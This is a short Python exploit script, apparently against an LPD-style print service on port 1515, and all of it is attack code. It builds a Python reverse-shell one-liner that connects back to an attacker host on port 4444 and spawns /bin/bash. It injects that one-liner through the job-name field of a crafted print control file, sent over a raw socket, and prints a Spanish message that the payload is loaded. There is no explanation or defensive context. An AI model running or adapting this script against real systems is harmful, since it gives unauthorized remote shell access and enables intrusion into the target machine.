#!/usr/bin/env python3
import socket, time

TARGET, PORT, LPORT = "ip", 1515, 4444
LHOST = "iplocal"

rev = (f"python3 -c 'import os,pty,socket;s=socket.socket();"
       f"s.connect((\"{LHOST}\",{LPORT}));"
       f"[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn(\"/bin/bash\")'")

payload = f"';{rev} #"
control = f"Hlocalhost\nProot\nJ{payload}\n".encode()

s = socket.create_connection((TARGET, PORT), timeout=5)
s.sendall(b"\x02archive_intake\n")
time.sleep(0.5)
s.sendall(b"\x02" + f"{len(control)} cfA001localhost\n".encode())
time.sleep(0.3)
s.recv(1)
s.sendall(control + b"\x00")
time.sleep(0.3)
s.recv(16)
s.close()
print("[+] payload cargado")
